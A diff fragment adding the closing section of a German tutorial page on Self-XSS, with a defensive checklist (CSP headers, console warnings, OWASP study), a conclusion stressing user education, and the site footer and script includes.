+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>Console-Warnung auf deiner Website implementieren</li>
+                            <li>XSS-Schutzmaßnahmen in deinen Projekten überprüfen</li>
+                            <li>Freunde &amp; Familie über Self-XSS aufklären</li>
+                            <li>CSP Headers lernen und implementieren</li>
+                            <li>OWASP Top 10 studieren für umfassendes Security-Wissen</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Fazit
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Self-XSS funktioniert, weil es Menschen manipuliert, nicht Computer.
+                            Aufklärung ist der beste Schutz. Teile dein Wissen und hilf anderen, sich zu schützen!</p>
+                    </div>
+                </section>
+
+                <!-- Prev/Next Navigation -->
+                <section class="categories">
+                    <nav class="tutorial-nav"><div class="tutorial-nav-prev"></div><div class="tutorial-nav-next"></div></nav>
+                </section>
+
+            </div> <!-- Wrapper .container -->
+
+        </div> <!-- Tutorial Layout -->
+
+    </main>
+
+    <!-- Footer-Start -->
+<footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <p class="footer-text">© <span id="currentYear">2025</span> DevPanicZone. Alle Rechte vorbehalten.</p>
+            <nav class="footer-nav">
+                <a href="/impressum.html">Impressum</a>
+                <a href="/datenschutz.html">Datenschutz</a>
+            </nav>
+        </div>
+    </div>
+</footer>
+<!-- Footer-End -->
+
+    <button id="scrollTopBtn" title="Nach oben">↑</button>
+    <script src="/assets/js/main.js" defer></script>
+    <script src="/assets/js/code-copy.js" defer></script>
+    <script src="/assets/js/sidebar.js" defer></script>
+    <script src="/assets/js/scroll-spy.js"></script>
+    <script src="/assets/js/search.js"></script>
+    <script src="/assets/vendor/prism/prism.js" defer></script>
+
+
+
+</body></html>
